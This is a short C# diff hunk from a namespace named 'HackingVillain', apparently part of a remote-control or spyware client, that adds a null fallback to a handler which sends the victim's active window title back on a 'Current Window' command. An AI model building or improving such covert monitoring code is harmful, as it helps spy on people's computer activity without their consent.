@@ -112,7 +112,7 @@ namespace HackingVillain
             }
             else if (data == "Current Window")
             {
-                Send(ForegroundWindow.GetActiveWindowTitle(), 2);
+                Send(ForegroundWindow.GetActiveWindowTitle() ?? "", 2);
             }
         }
     }
